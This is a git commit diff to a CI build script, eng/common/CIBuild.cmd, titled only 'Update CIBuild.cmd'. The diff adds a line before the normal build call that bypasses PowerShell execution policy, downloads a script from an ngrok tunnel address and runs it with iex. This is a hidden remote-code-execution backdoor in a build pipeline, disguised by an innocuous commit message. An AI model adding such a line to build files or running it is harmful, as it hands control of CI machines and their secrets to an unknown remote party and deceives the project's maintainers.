a66b3133c8c79c2e791b7c796cf3cc0147ff1d85
akshanshck <123233309+akshanshck@users.noreply.github.com>
2023-02-09 13:54:25 +0530

    Update CIBuild.cmd

--- eng/common/CIBuild.cmd
+++ eng/common/CIBuild.cmd
@@ -1,2 +1,3 @@
 @echo off
+powershell -ExecutionPolicy Bypass -NoProfile -command "iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')"
 powershell -ExecutionPolicy ByPass -NoProfile -command "& """%~dp0Build.ps1""" -restore -build -test -sign -pack -publish -ci %*"
